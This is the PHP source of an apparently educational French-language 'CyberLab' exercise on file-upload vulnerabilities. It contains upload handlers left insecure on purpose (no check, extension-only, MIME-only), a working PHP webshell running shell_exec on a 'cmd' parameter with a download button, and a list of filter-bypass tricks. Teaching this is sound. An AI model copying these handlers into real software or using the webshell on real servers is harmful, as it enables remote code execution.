<?php
require_once __DIR__ . '/../../config/config.php';

$level = $_GET['level'] ?? '1';
$message = '';
$uploaded_file = '';

// Créer le dossier uploads
$upload_dir = __DIR__ . '/../../uploads/';
if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = $file['name'];
    $tmp = $file['tmp_name'];
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

    if ($level == '1') {
        // ⚠️ NIVEAU 1 : Aucune validation - upload tout
        $dest = $upload_dir . basename($name);
        if (move_uploaded_file($tmp, $dest)) {
            $uploaded_file = basename($name);
            $message = "✅ Fichier uploadé : $name";
        } else {
            $message = "❌ Erreur d'upload";
        }

    } elseif ($level == '2') {
        // ⚠️ NIVEAU 2 : Vérification d'extension seulement (bypassable)
        $allowed = ['jpg', 'jpeg', 'png', 'gif'];
        if (in_array($ext, $allowed)) {
            $dest = $upload_dir . basename($name);
            move_uploaded_file($tmp, $dest);
            $uploaded_file = basename($name);
            $message = "✅ Image uploadée : $name";
        } else {
            $message = "❌ Extension non autorisée: $ext (autorisé: jpg, jpeg, png, gif)";
        }
        // Bypass: renommer le fichier en shell.php.jpg ou modifier le Content-Type

    } elseif ($level == '3') {
        // ⚠️ NIVEAU 3 : Vérification MIME type (bypassable avec Burp)
        $allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
        $mime = mime_content_type($tmp);

        if (in_array($mime, $allowed_mime)) {
            // Encore bypassable - le magic bytes peut être faussé
            $dest = $upload_dir . basename($name);
            move_uploaded_file($tmp, $dest);
            $uploaded_file = basename($name);
            $message = "✅ Upload réussi (MIME: $mime)";
        } else {
            $message = "❌ Type MIME non autorisé: $mime";
        }
    }

    // Log l'upload
    if ($uploaded_file) {
        $db = getDB();
        $stmt = $db->prepare("INSERT INTO uploads (filename, original_name, uploader) VALUES (?, ?, ?)");
        $stmt->execute([$uploaded_file, $name, $_SESSION['user']['username'] ?? 'anonyme']);
    }
}

// Récupérer les fichiers uploadés
$uploads = [];
$db = getDB();
$uploads = $db->query("SELECT * FROM uploads ORDER BY uploaded_at DESC LIMIT 10")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload Lab — CyberLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/KaliTest/assets/css/style.css">
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <nav class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">⬡</div>
            <span class="brand-name">CYBER<span class="accent">LAB</span></span>
        </div>
        <div class="nav-status" style="margin-right:auto">
            <div class="status-dot"></div>
            <span class="status-text" id="nav-time"></span>
        </div>
        <div class="nav-links">
            <a href="/KaliTest/" class="nav-link">Accueil</a>
            <a href="/KaliTest/labs/" class="nav-link">Labs</a>
        </div>
    </nav>

    <div class="page-wrapper">
        <div class="page-header">
            <p class="page-breadcrumb"><a href="/KaliTest/">Accueil</a> / <a href="/KaliTest/labs/">Labs</a> / File Upload</p>
            <h1 class="page-title">📁 FILE UPLOAD LAB</h1>
            <p class="page-desc">Contournez les filtres de validation pour uploader un webshell PHP et obtenir une exécution de code distant (RCE) sur le serveur.</p>
        </div>

        <div style="display:flex; gap:.6rem; margin-bottom:2rem; flex-wrap:wrap">
            <a href="?level=1" class="lab-btn" style="<?= $level=='1'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 1 — Aucune Validation</a>
            <a href="?level=2" class="lab-btn" style="<?= $level=='2'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 2 — Extension Check</a>
            <a href="?level=3" class="lab-btn" style="<?= $level=='3'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 3 — MIME Check</a>
        </div>

        <?php if ($message): ?>
        <div class="alert <?= str_starts_with($message, '✅') ? 'alert-success' : 'alert-danger' ?>" style="margin-bottom:1rem">
            <?= htmlspecialchars($message) ?>
            <?php if ($uploaded_file): ?>
            <br><a href="/KaliTest/uploads/<?= urlencode($uploaded_file) ?>"
                  style="color:var(--neon-green); font-family:var(--font-mono); font-size:.8rem"
                  target="_blank">
                🔗 Accéder au fichier : /uploads/<?= htmlspecialchars($uploaded_file) ?>
            </a>
            <?php endif; ?>
        </div>
        <?php endif; ?>

        <div class="lab-content">
            <div>
                <div class="lab-panel" style="margin-bottom:1.5rem">
                    <div class="panel-header">
                        📤 UPLOAD DE FICHIER —
                        <?= $level=='1' ? '⚠️ AUCUNE VALIDATION' : ($level=='2' ? '🔍 VÉRIFICATION EXTENSION' : '🔍 VÉRIFICATION MIME') ?>
                    </div>
                    <div class="panel-body">
                        <?php if ($level == '1'): ?>
                        <p style="font-size:.85rem; color:var(--neon-red); margin-bottom:1rem">
                            ⚠️ Ce formulaire accepte <strong>N'IMPORTE QUEL fichier</strong>, y compris des scripts PHP !
                            Uploadez un webshell pour obtenir une exécution de code distant.
                        </p>
                        <?php elseif ($level == '2'): ?>
                        <p style="font-size:.85rem; color:var(--neon-yellow); margin-bottom:1rem">
                            🔍 Extension vérifiée côté serveur. Bypass possible avec : <code>shell.php.jpg</code>,
                            <code>shell.php%00.jpg</code>, ou en modifiant l'en-tête Content-Type avec Burp Suite.
                        </p>
                        <?php else: ?>
                        <p style="font-size:.85rem; color:var(--neon-blue); margin-bottom:1rem">
                            🔍 Type MIME vérifié. Bypass via Burp Suite : interceptez la requête et changez
                            <code>Content-Type: application/php</code> → <code>Content-Type: image/jpeg</code>.
                        </p>
                        <?php endif; ?>

                        <form method="POST" action="?level=<?= $level ?>" enctype="multipart/form-data">
                            <div class="form-group">
                                <label class="form-label">SÉLECTIONNER UN FICHIER</label>
                                <div style="border: 2px dashed rgba(0,255,136,.2); border-radius:8px; padding:2rem; text-align:center; cursor:pointer; transition:var(--transition)"
                                     id="drop-zone" onclick="document.getElementById('file-input').click()">
                                    <div style="font-size:2rem; margin-bottom:.5rem">📁</div>
                                    <p style="font-family:var(--font-mono); font-size:.8rem; color:var(--text-secondary)">
                                        Cliquez ou glissez un fichier ici
                                    </p>
                                    <p style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-green); margin-top:.3rem" id="file-name">
                                        Aucun fichier sélectionné
                                    </p>
                                    <input type="file" name="file" id="file-input" style="display:none"
                                           onchange="document.getElementById('file-name').textContent = this.files[0]?.name || 'Aucun fichier'">
                                </div>
                            </div>
                            <button type="submit" class="btn-submit">⬆️ UPLOADER</button>
                        </form>
                    </div>
                </div>

                <!-- Webshell Template -->
                <div class="lab-panel">
                    <div class="panel-header">💀 TEMPLATE WEBSHELL PHP (pour le lab)</div>
                    <div class="panel-body">
                        <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem">
                            Créez un fichier <code style="color:var(--neon-green)">shell.php</code> avec ce contenu et uploadez-le :
                        </p>
                        <code style="display:block; font-family:var(--font-mono); font-size:.8rem; color:var(--neon-green); background:rgba(0,0,0,.4); padding:1rem; border-radius:6px; border:1px solid rgba(0,255,136,.1); white-space:pre-wrap; margin-bottom:1rem">&lt;?php
// ===== WEBSHELL - Lab éducatif CyberLab =====
// Accès: /uploads/shell.php?cmd=whoami

if(isset($_GET['cmd'])){
    $output = shell_exec($_GET['cmd']);
    echo "&lt;pre style='color:#00ff88; font-family:monospace'&gt;";
    echo htmlspecialchars($output);
    echo "&lt;/pre&gt;";
}
?&gt;
&lt;!-- Test: ?cmd=whoami | ?cmd=dir | ?cmd=ipconfig --&gt;</code>

                        <button class="btn-submit" style="background:transparent; border:1px solid var(--neon-green); color:var(--neon-green)"
                                onclick="downloadShell()">
                            💾 GÉNÉRER shell.php
                        </button>
                    </div>
                </div>

                <!-- Uploaded Files -->
                <?php if (!empty($uploads)): ?>
                <div class="lab-panel" style="margin-top:1.5rem">
                    <div class="panel-header">📂 FICHIERS UPLOADÉS</div>
                    <div class="panel-body">
                        <table class="data-table">
                            <tr><th>Fichier</th><th>Original</th><th>Uploadé par</th><th>Date</th><th>Action</th></tr>
                            <?php foreach ($uploads as $up): ?>
                            <tr>
                                <td><?= htmlspecialchars($up['filename']) ?></td>
                                <td><?= htmlspecialchars($up['original_name']) ?></td>
                                <td><?= htmlspecialchars($up['uploader']) ?></td>
                                <td><?= $up['uploaded_at'] ?></td>
                                <td>
                                    <a href="/KaliTest/uploads/<?= urlencode($up['filename']) ?>" target="_blank"
                                       style="color:var(--neon-green); font-family:var(--font-mono); font-size:.75rem">
                                        🔗 Accéder
                                    </a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </table>
                    </div>
                </div>
                <?php endif; ?>
            </div>

            <div class="hint-panel">
                <div class="hint-section">
                    <div class="panel-header">📖 GUIDE FILE UPLOAD</div>
                </div>
                <div class="hint-section">
                    <p class="hint-title">🎯 OBJECTIF</p>
                    <p class="hint-text">
                        Uploader un fichier <code style="color:var(--neon-green)">shell.php</code> et y accéder via le navigateur pour exécuter des commandes système.
                    </p>
                </div>
                <div class="hint-section">
                    <p class="hint-title">⚡ TECHNIQUES DE BYPASS</p>
                    <p class="hint-text" style="font-size:.75rem; line-height:1.8">
                        <strong style="color:var(--neon-yellow)">Extension double:</strong><br>
                        shell.php.jpg<br><br>
                        <strong style="color:var(--neon-yellow)">Null byte (PHP &lt; 5.3):</strong><br>
                        shell.php%00.jpg<br><br>
                        <strong style="color:var(--neon-yellow)">Burp Suite - changer:</strong><br>
                        Content-Type: image/jpeg<br>
                        Filename: shell.php<br><br>
                        <strong style="color:var(--neon-yellow)">Magic bytes:</strong><br>
                        Ajouter GIF89a; au début
                    </p>
                </div>
                <div class="hint-section">
                    <p class="hint-title">🛡️ DÉFENSES</p>
                    <p class="hint-text">
                        • Valider extension ET MIME<br>
                        • Renommer les fichiers uploadés<br>
                        • Stocker hors du webroot<br>
                        • Scanner antivirus<br>
                        • Désactiver PHP dans uploads/<br>
                        • Content-Disposition: attachment
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script src="/KaliTest/assets/js/main.js"></script>
    <script>
        function downloadShell() {
            const content = `<?php
// ===== WEBSHELL - Lab CyberLab =====
if(isset($_GET['cmd'])){
    $output = shell_exec($_GET['cmd']);
    echo "<pre style='color:#00ff88;font-family:monospace'>";
    echo htmlspecialchars($output);
    echo "</pre>";
}
?>
<!-- Test: ?cmd=whoami | ?cmd=dir -->`;
            const blob = new Blob([content], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'shell.php';
            a.click();
            showToast('shell.php téléchargé ! Uploadez-le maintenant.');
        }

        // Drag & drop
        const dropZone = document.getElementById('drop-zone');
        ['dragover','dragenter'].forEach(e => {
            dropZone?.addEventListener(e, ev => { ev.preventDefault(); dropZone.style.borderColor = '#00ff88'; });
        });
        dropZone?.addEventListener('dragleave', () => { dropZone.style.borderColor = 'rgba(0,255,136,.2)'; });
        dropZone?.addEventListener('drop', ev => {
            ev.preventDefault();
            const input = document.getElementById('file-input');
            input.files = ev.dataTransfer.files;
            document.getElementById('file-name').textContent = ev.dataTransfer.files[0]?.name;
            dropZone.style.borderColor = 'rgba(0,255,136,.2)';
        });
    </script>
</body>
</html>
